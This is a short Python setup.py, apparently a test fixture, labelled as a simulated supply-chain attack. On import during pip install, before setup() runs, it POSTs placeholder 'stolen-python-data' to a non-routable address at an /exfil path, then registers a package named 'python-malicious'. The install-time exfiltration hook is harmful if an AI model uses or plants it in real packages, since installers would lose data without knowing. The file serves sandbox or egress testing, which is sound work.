# Simulated supply-chain attack via setup.py
# pip runs this file during package install. The exfil fires during
# import of the module, before setup() is called — so it runs as part
# of `pip install .` without needing a custom build hook.
import sys
import urllib.request
from setuptools import setup

try:
    req = urllib.request.Request(
        'http://10.255.255.1:80/exfil',
        data=b'stolen-python-data',
        method='POST'
    )
    urllib.request.urlopen(req, timeout=5)
except Exception as e:
    print(f'[setup.py] exfil failed: {e}', file=sys.stderr)

print('[setup.py] exfil attempted', file=sys.stderr)

setup(
    name='python-malicious',
    version='1.0.0',
    py_modules=['app'],
)
